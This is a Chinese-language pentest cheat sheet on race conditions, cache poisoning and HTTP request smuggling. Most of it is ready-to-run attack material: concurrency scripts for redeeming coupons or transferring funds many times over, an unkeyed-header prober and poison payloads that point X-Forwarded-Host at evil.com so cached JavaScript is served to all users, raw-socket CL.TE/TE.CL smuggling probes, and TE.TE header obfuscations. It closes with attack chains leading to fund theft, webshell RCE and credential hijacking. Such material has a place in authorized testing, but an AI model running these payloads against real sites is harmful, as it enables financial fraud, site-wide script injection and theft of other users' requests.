# Race Condition / Cache Poisoning / Request Smuggling

## 1. Race Condition

### Turbo Intruder 并发模板

```python
# race_turbo.py — Turbo Intruder 脚本 (粘贴到 Burp)
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=30,  # 并发连接数
        requestsPerConnection=100, # 每连接请求数
        pipeline=False
    )

    # 构造两个请求: 第一个改变状态，第二个在状态改变前也通过
    for i in range(50):
        engine.queue(target.req)   # 同时发出 50 个相同请求

def handleResponse(req, interesting):
    table.add(req)  # 每个响应都记录
```

### 经典竞态场景

```python
# 场景 1: 优惠券/优惠码多次使用
# POST /api/redeem {"code": "ONETIME-CODE"}
# → 并发 50 次 → 多次成功

# 场景 2: 钱包/余额转账
# POST /api/transfer {"to": "attacker", "amount": balance}
# → 并发转账 → 余额被负数扣除前已转走

# 场景 3: 邀请码
# POST /api/invite → 返回唯一邀请码
# → 并发请求 → 同一用户拿到多个邀请码

# 场景 4: 投票
# POST /api/vote {"target": "A"}
# → 并发投票 → 突破每人一票限制

# 场景 5: Reset Token 绕过
# POST /api/reset-password {"email": "victim@test.com"}
# 同时: POST /api/verify-token {"token": "GUESS"}
# → 旧的 token 还未失效，新的 token 已生成
```

### Python 并发模板

```python
# race.py — 通用 race condition 测试
import concurrent.futures, requests, time

def race_test(url: str, method='POST', headers=None, data=None, json=None,
              count: int = 50, max_workers: int = 20):
    """并发发送 count 个相同请求"""
    def send_one(_):
        if method == 'POST':
            return requests.post(url, headers=headers, data=data, json=json)
        return requests.get(url, headers=headers)

    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as ex:
        futures = [ex.submit(send_one, i) for i in range(count)]
        results = [f.result() for f in concurrent.futures.as_completed(futures)]

    # 统计
    status_counts = {}
    for r in results:
        status_counts[r.status_code] = status_counts.get(r.status_code, 0) + 1
    return status_counts, results

# 使用
codes, _ = race_test("https://target.com/api/redeem",
    json={"code": "ONETIME-CODE"}, count=50)
print(codes)  # {200: 5, 400: 45} → 5 次成功 = race bug!
```

## 2. Cache Poisoning

### 探测 Unkeyed Headers

```python
# 找出 CDN cache key 不包含但后端处理的 header
import requests

def find_unkeyed_headers(target_url: str):
    """探测哪些 header 影响响应内容但不影响 cache key"""
    baseline = requests.get(target_url)
    cache_status_baseline = baseline.headers.get("X-Cache", "")

    CANDIDATES = [
        ("X-Forwarded-Host", "evil.com"),
        ("X-Forwarded-Scheme", "http"),
        ("X-Forwarded-Port", "80"),
        ("X-Original-URL", "/admin"),
        ("X-Rewrite-URL", "/admin"),
        ("X-HTTP-Method-Override", "PUT"),
        ("Forwarded", "for=evil.com"),
        ("Origin", "https://evil.com"),
        ("Referer", "https://evil.com"),
        ("User-Agent", "special-poison-test"),
    ]

    for header, value in CANDIDATES:
        r = requests.get(target_url, headers={header: value})
        # 检查是否被缓存
        if "hit" in r.headers.get("X-Cache", "").lower():
            # 如果能缓存且内容不同 → unkeyed header 可毒化
            if r.text != baseline.text:
                print(f"[!] Unkeyed: {header}: {value}")
                # 验证毒化效果
                r2 = requests.get(target_url)  # 不带 header 再请求
                if r2.text == r.text:
                    print(f"    [!] CACHE POISONED! {header}")

find_unkeyed_headers("https://target.com/home")
```

### 毒化 Payload

```python
# 通过 unkeyed header 注入恶意内容到缓存
POISON_PROBES = {
    # X-Forwarded-Host → 重定向/资源路径劫持
    "X-Forwarded-Host": "evil.com",
    # Host → 首页/绝对路径劫持
    "Host": "evil.com",
    # 协议降级 → 资源劫持
    "X-Forwarded-Scheme": "http",
    # 404/error 页面注入
    "X-Original-URL": "/nonexistent_xss_payload",
    # cookie 导致的差异化缓存
    "Cookie": "lang=../../../evil.com/xss",
}

# 实际 payload: 用 X-Forwarded-Host 让 CDN 缓存一个 redirect 到
# evil.com 的 JS → 所有后续用户都加载恶意 JS
```

## 3. Request Smuggling

### CL.TE vs TE.CL 探测

```python
# 仅在授权环境测试！
def probe_smuggling(target: str):
    """CL.TE / TE.CL 差异探测"""
    import socket, ssl

    def raw_request(host, port, use_tls, payload_bytes):
        sock = socket.socket()
        if use_tls:
            sock = ssl.wrap_socket(sock)
        sock.connect((host, port))
        sock.send(payload_bytes)
        return sock.recv(4096)

    host = target.replace("https://", "").replace("http://", "").split("/")[0]
    port = 443 if target.startswith("https") else 80
    use_tls = target.startswith("https")

    # CL.TE probe
    cl_te = (
        b"POST / HTTP/1.1\r\n"
        b"Host: " + host.encode() + b"\r\n"
        b"Content-Length: 6\r\n"
        b"Transfer-Encoding: chunked\r\n"
        b"\r\n"
        b"0\r\n"
        b"\r\n"
        b"G"  # 这个 G 如果被后端处理 → CL.TE
    )
    r = raw_request(host, port, use_tls, cl_te)
    if b"405" in r or b"Unrecognized" in r:
        print("[!] CL.TE Smuggling possible")
    else:
        print(f"[*] CL.TE result: {r.decode()[:200]}")

    # TE.CL probe
    te_cl = (
        b"POST / HTTP/1.1\r\n"
        b"Host: " + host.encode() + b"\r\n"
        b"Content-Length: 4\r\n"
        b"Transfer-Encoding: chunked\r\n"
        b"\r\n"
        b"5c\r\n"  # 大 chunk
        b"GPOST / HTTP/1.1\r\n"
        b"\r\n"
        b"0\r\n"
        b"\r\n"
    )
    r = raw_request(host, port, use_tls, te_cl)
    # 如果后端看到 GPOST → TE.CL
    if b"GPOST" in r or b"405" in r:
        print("[!] TE.CL Smuggling possible")
```

### TE.TE 混淆

```text
Transfer-Encoding: chunked
Transfer-encoding: x
Transfer-Encoding: xchunked
Transfer-Encoding:[tab]chunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked\r\nTransfer-Encoding: x
```

### H2.CL / H2.TE (HTTP/2)

```python
# HTTP/2 不支持 Transfer-Encoding，但支持 Content-Length
# 如果前端用 HTTP/2，后端用 HTTP/1.1 → 降级攻击

# H2.CL: HTTP/2 头部注入 Content-Length: 0
# 前端认为请求体为空
# 降级到 HTTP/1.1 后，后端看到 CL=0 → 后面的数据成新请求
```

---

## 4. 更多竞态场景

```python
# 场景 6: 文件上传 + 包含竞态
# 上传 webshell → 在上传完成但未重命名/杀毒前 → 立刻访问

# 场景 7: 注册邮箱验证
# 注册 → 发送验证邮件 → 在验证完成前登录 → 可能跳过验证

# 场景 8: 订单取消 vs 发货
# 两点: POST /cancel + GET /confirm 同时发 → 订单既被取消又发货

# 场景 9: 邀请制注册
# 无邀请码 → 并发请求 → 突破名额限制

# 场景 10: 密码重置
# POST /forgot (受害者) + POST /verify?token=ATTACKER_GUESS
# 新旧 token 同时有效窗口 → 竞态
```

## 5. Cache Poisoning 进阶

```python
# Fat GET: 带 body 的 GET 请求
# 某些 CDN 用 GET + headers 做 cache key, 但后端处理 body

# 响应拆分毒化
# X-Forwarded-Host: evil.com → 后端返回 redirect → CDN 缓存 redirect

# 路径混淆
# /home%0d%0aX-Injected:%20evil → URI 规范化差异
```

## 6. 攻击链

```
Race Condition → 并发兑换 → 多次成功 → 余额溢出
Race Condition → 并发转账 → 负余额 → 资金窃取
Race Condition → 上传+包含 → webshell 竞态 → RCE
Race Condition → 注册+验证 → 跳过邮箱验证 → 任意注册
Cache Poisoning → X-Forwarded-Host → JS 资源劫持 → 全站 XSS
Cache Poisoning → unkeyed cookie → 差异化缓存 → 定向攻击
CL.TE Smuggling → 请求走私 → 劫持后续用户请求 → 凭证窃取
CL.TE Smuggling → 绕过前端 ACL → 直接打后端 → Admin API
H2.CL Smuggling → HTTP/2 降级 → 注入请求 → 内网 SSRF
```

## Evidence

记录: 并发数和结果分布、cache header (X-Cache, Age, Cache-Control)、原始 HTTP bytes (CRLF 位置)、smuggling probe 的两种解析结果、竞态成功次数 / 总次数
